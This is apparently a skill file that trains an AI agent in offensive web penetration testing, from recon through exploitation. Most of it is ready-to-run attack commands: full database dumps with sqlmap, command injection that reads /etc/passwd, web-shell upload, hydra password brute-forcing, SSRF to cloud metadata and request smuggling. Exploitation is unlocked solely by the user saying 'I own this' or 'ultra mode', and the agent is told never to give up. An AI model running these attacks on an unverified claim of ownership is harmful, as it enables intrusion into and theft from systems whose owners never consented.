---
name: hacker-mindset
description: Train the agent to think like a real security researcher — the intuition, the methodology, the deeper techniques, and the ultra mode. Covers recon, exploitation, and the mindset of finding what others miss.
---

# Hacker Mindset — Full Security Researcher Training

## Core Philosophy

You are not a scanner. You are a **human-level security researcher** with unlimited patience and creativity. Scanners find low-hanging fruit. You find what scanners miss.

**The 3 Laws of the Hacker Mindset:**
1. **Every endpoint is a door.** If one door is locked, try the window, the roof, the basement, the side entrance, the service entrance, the mail slot.
2. **Every error message is a clue.** "404 Not Found" tells you there's a routing system. "500 Internal Server Error" tells you there's a database. "Invalid token" tells you there's a token parser.
3. **Every technology has known weaknesses.** If you see nginx → check for path traversal. If you see Express → check for prototype pollution. If you see PHP → check for LFI/RFI. If you see JWT → check for alg:none.

**⚠️ CRITICAL RULE — NEVER use your own project's tools against your own database:**
When pentesting a target, every tool you use must target the TARGET's infrastructure, not your own. Specifically:
- **NEVER read or search your own project files.** `db.js`, `.env`, `services/`, `agentEngine.js`, `manusTools.js`, `enterpriseTools.js`, `sandboxAgent.js`, `kaliBootstrap.js`, `userMemory.js`, `userAdaptation.js` — ALL off-limits.
- **NEVER use `supabase_tables` or any database tool without passing the target's explicit credentials.** These tools default to your own project's SUPABASE_URL / SUPABASE_SERVICE_KEY env vars, which would query your OWN database instead of the target's.
- **NEVER run `psql` or database queries against your own DB.** You're testing the target, not yourself.
- **NEVER use `curl` to check your own endpoints.** You're testing the target's URLs.
- **If you need to check a target's Supabase, ask the user for the target's URL and service key.** Do NOT use your own.
- **If you need to query a database, do it INSIDE the target's infrastructure (via the target's sandbox, API, or exposed endpoint), not from your own tools.**
- **The ONLY files you should read are the target's files if you have access to them.** Never read your own project's internal code.

---

## Phase 0: The Researcher's Entry Scan (MY exact method)

This is NOT a tool list. This is the **exact sequence of checks I do** in the first 60 seconds of looking at a target.

### Step 0.1 — The Quick Grab (10 seconds)
```bash
# Get everything: headers, page source, response time
curl -sI -L "https://target.com" 2>&1
curl -s "https://target.com" | head -200
```

**What I look for:**
- `Server:` header → tells me the tech stack (nginx, Apache, Express, IIS, Cloudflare)
- `X-Powered-By:` → Express, PHP, ASP.NET
- `Set-Cookie:` → session format (PHPSESSID, JSESSIONID, connect.sid, laravel_session)
- `Location:` → redirect behavior, open redirect potential
- `Content-Security-Policy:` → how locked down is the frontend
- Page source comments → `<!-- TODO: remove debug -->`, `<!-- API key: -->`
- Hidden inputs → `type="hidden"` with tokens or IDs

### Step 0.2 — The 20-Second Probe (20 seconds)
```bash
# Check the most common exposed paths in parallel
for path in .env .git/config .git/HEAD admin/ login/ api/ \
  robots.txt sitemap.xml config/ backup/ db/ phpmyadmin/ \
  wp-admin/ wp-content/ crossdomain.xml client-access-policy.xml \
  swagger.json api-docs graphql health version info; do
  echo -n "$path: "
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path"
done
```

**What I look for:**
- `.env` → database credentials, API keys, secrets (200 = game over)
- `.git/HEAD` → full repo exposed (200 = I can clone the entire codebase)
- `admin/` → admin panel (200 = try default creds)
- `robots.txt` → hidden paths the developer tried to hide
- `swagger.json` → full API documentation exposed
- `graphql` → GraphQL introspection (check if queries are accepted)
- `crossdomain.xml` / `client-access-policy.xml` → Flash/Silverlight security policies

### Step 0.3 — Subdomain & Service Discovery (30 seconds)
```bash
# Check common subdomains
for sub in admin api dev staging test mail cdn blog \
  dashboard portal app www2 beta sandbox; do
  echo -n "$sub: "
  curl -s -o /dev/null -w "%{http_code}" "https://$sub.target.com" 2>/dev/null || echo "NXDOMAIN"
done
```

**What I look for:**
- A subdomain that returns 200 when the main domain returns 401 → the subdomain is **less secure**
- A subdomain that returns a different tech stack → different attack surface
- `dev.target.com` or `staging.target.com` → likely has debug endpoints, weaker auth

### Step 0.4 — JS Bundle Analysis (critical)
```bash
# Find all JS files
curl -s "https://target.com" | grep -oP 'src="[^"]+\.js"' | cut -d'"' -f2 | while read js; do
  echo "=== $js ==="
  # Check for absolute URLs
  curl -s "https://target.com/$js" | grep -oP 'https?://[^"'"'"'\\s,;)]+' | sort -u | head -5
  # Check for API endpoints
  curl -s "https://target.com/$js" | grep -oP '/api/[^"'"'"'\\s,;)]+' | sort -u | head -10
  # Check for hardcoded secrets
  curl -s "https://target.com/$js" | grep -oP '(sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+)' | head -5
done
```

**What I look for:**
- API endpoints in JS that aren't documented
- Hardcoded API keys, JWT tokens, GitHub tokens
- Backend URLs (internal services, database URLs)
- Commented-out code with credentials

---

## Phase 1: Deep Recon (Tool-Assisted)

Only after Phase 0 reveals the target's surface, use the heavy tools:

### DNS Enumeration
```bash
# Full DNS dump
dig any target.com @8.8.8.8
dnsrecon -d target.com -t axfr  # Try zone transfer (rarely works, but when it does...)
nslookup -type=any target.com

# Subdomain enumeration
sublist3r -d target.com -o subdomains.txt
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Port Scanning
```bash
# Quick scan (top 1000 ports, version detection)
nmap -sS -sV -T4 -Pn target.com

# Full scan (all 65535 ports)
nmap -sS -sV -p- -T4 -Pn target.com

# Vulnerability scripts
nmap --script vuln -sV -T4 -Pn target.com

# UDP scan (often overlooked)
nmap -sU --top-ports 100 -T4 -Pn target.com
```

### Technology Fingerprinting
```bash
whatweb -v target.com
curl -sI target.com | grep -i "^\(server\|x-powered-by\|x-aspnet\|set-cookie\)"
```

---

## Phase 2: Web Application Testing (Systematic)

### Directory & File Discovery
```bash
# Recursive directory brute-force (feroxbuster is faster than gobuster)
feroxbuster -u "https://target.com" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -d 3

# Extension-specific files
gobuster dir -u "https://target.com" -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,js,txt,zip,tar,gz,sql,env,bak,old,swp,save

# Parameter discovery
arjun -u "https://target.com/api/endpoint"
```

### API Testing
```bash
# Check for common API patterns
for method in GET POST PUT DELETE PATCH; do
  echo "=== $method ==="
  curl -s -X $method "https://target.com/api/v1/" -H "Content-Type: application/json" | head -5
done

# GraphQL introspection
curl -s "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}' | head -50

# IDOR testing (increment IDs)
for id in 1 2 3 100 1000; do
  curl -s "https://target.com/api/users/$id" | head -3
done
```

### Injection Testing
```bash
# SQL injection
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2

# SQL injection with forms crawl
sqlmap -u "https://target.com" --batch --crawl=3 --forms

# XSS check
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep -i "<script>alert"

# SSRF check
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/" | head -20
```

---

## Phase 3: Authentication & Session Analysis

### Cookie Analysis
```bash
# Get the session cookie
curl -sI "https://target.com/login" -d "user=test&pass=test" | grep -i "set-cookie"

# Decode JWT (if applicable)
echo "eyJ...jwt...token" | cut -d. -f2 | base64 -d 2>/dev/null
```

### Brute-Force Testing
```bash
# SSH brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# Web form brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Directory basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-get /admin/
```

---

## Phase 4: Exploitation (Only if authorized)

### When the user says "exploit it" or "I own this":
```bash
# SQLi → dump database
sqlmap -u "https://target.com/page?id=1" --batch --dump --all

# LFI → read files
sqlmap -u "https://target.com/page?file=1" --batch --file-read="/etc/passwd"

# Command injection
curl -s "https://target.com/ping?host=127.0.0.1;cat /etc/passwd"

# File upload bypass
curl -s -F "file=@shell.php;type=image/jpeg" "https://target.com/upload"

# SSRF → cloud metadata
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```

---

## ULTRA MODE — When the user says "no system is secure" or "ultra mode"

**This changes the rules.** The user is authorizing DEEP testing. Do everything above PLUS:

### 1. Zero-Day Style Thinking
- **Check every parameter for every type of injection** — not just SQLi, but NoSQLi, LDAPi, XMLi, template injection (SSTI), header injection, CRLF injection
- **Check every file upload** for: extension bypass, content-type bypass, magic byte bypass, double extension, path traversal in filename
- **Check every redirect** for: open redirect, SSRF via redirect, protocol smuggling

### 2. Business Logic Abuse
- **Negative numbers** in price/quantity fields → `?price=-100`
- **Race conditions** → send the same request 50 times simultaneously
- **Mass assignment** → try `?role=admin`, `?is_admin=true`, `?admin=1`
- **IDOR with encoding** → try base64 IDs, hex IDs, UUIDs, hashed IDs
- **Coupon/promo abuse** → try `?coupon=TEST`, `?coupon=ADMIN`, `?coupon=100OFF`

### 3. Infrastructure Attacks
- **Check for exposed Docker sockets** → `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`
- **Check for Kubernetes metadata** → `curl -s http://169.254.169.254/`, `curl -s http://metadata.google.internal/`
- **Check for AWS/GCP/Azure metadata** → `curl -s http://169.254.169.254/latest/meta-data/`, `curl -s http://metadata.google.internal/computeMetadata/v1/`
- **Check for Redis/Memcached/MongoDB without auth** → `nmap --script redis-info -p 6379 target.com`

### 4. Protocol & Transport Attacks
- **HTTP Request Smuggling** → `curl -s "https://target.com" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"`
- **Host header injection** → `curl -s "https://target.com" -H "Host: evil.com"`
- **X-Forwarded-For bypass** → `curl -s "https://target.com/admin" -H "X-Forwarded-For: 127.0.0.1"`
- **WebSocket hijacking** → check if WS endpoints lack origin validation

### 5. The "GitHub Dump" (if applicable)
```bash
# Check if the company has a public repo
git clone --depth=1 https://github.com/company/repo.git /tmp/repo 2>/dev/null
cd /tmp/repo && git log --all --oneline --diff-filter=A --name-only | head -20
# Check for committed secrets
grep -r "password\|secret\|token\|api_key\|AWS_SECRET\|SK-" --include="*.{ts,js,py,go,java,env,config,yml,yaml,json}" . 2>/dev/null | head -20
```

### 6. Dependency & Supply Chain Attacks
- Check for outdated libraries with known CVEs
- Check for default credentials in common admin panels
- Check for exposed package.json/composer.json with known vulnerable versions

---

## Tool Wiring — Which Tool for Which Job

| Scenario | Tool | Why |
|----------|------|-----|
| "Quick check if .env exists" | `curl` | Fastest, no install needed |
| "Find all subdomains" | `sublist3r` + `gobuster dns` | Two approaches cover more |
| "Find all directories" | `feroxbuster` | Faster than gobuster, recursive |
| "Find hidden params" | `arjun` | Specifically designed for this |
| "Full port scan" | `nmap -sS -sV -p-` | Industry standard |
| "SQL injection" | `sqlmap` | Best in class |
| "Technology stack" | `whatweb` | Most accurate fingerprinting |
| "WAF detection" | `wafw00f` | Tells you what to avoid |
| "Password brute-force" | `hydra` | Supports all protocols |
| "Hash cracking" | `john` + `hashcat` | CPU + GPU cracking |
| "Web fuzzing" | `ffuf` | Fastest fuzzer |
| "API discovery" | `curl` + manual inspection | No tool beats human pattern recognition |
| "JS secret hunting" | `curl` + `grep` | Manual inspection of JS bundles |
| "GraphQL testing" | `curl` with introspection query | No specialized tool needed |
| "SSRF testing" | `curl` to cloud metadata | Manual, targeted |
| "Race condition" | `curl` in parallel | `seq 50 \| xargs -P 50 curl` |

---

## The Mindset Rules

1. **One tool is never enough.** If nmap finds nothing, try masscan. If gobuster finds nothing, try feroxbuster. If sqlmap finds nothing, try manual injection.
2. **The strangest thing is usually the vulnerability.** A 500 error, a weird header, an unusual cookie format — investigate it.
3. **If you get 401, try without auth.** Many endpoints are more permissive without a token.
4. **If you get 403, try different methods.** POST instead of GET, PUT instead of POST, OPTIONS to see allowed methods.
5. **If you get a rate limit, wait 60 seconds and try a different approach.** Don't brute-force through it.
6. **Document everything.** Every command you run, every output you get. The report is the deliverable.
7. **Never give up.** If a tool fails, install it differently. If an approach fails, try a different approach. The sandbox can install anything.

## Deliverable Format

After completing the assessment, produce a Markdown report with:
1. **Target:** URL, IP, tech stack
2. **Phase 0 findings:** Exposed files, endpoints, JS secrets
3. **Phase 1 findings:** Open ports, services, subdomains
4. **Phase 2-3 findings:** Vulnerabilities found (with severity: Critical/High/Medium/Low/Info)
5. **Exploitation results:** (if authorized) Proof of access, data extracted
6. **Remediation:** How to fix each finding
7. **Commands used:** Full command log for reproducibility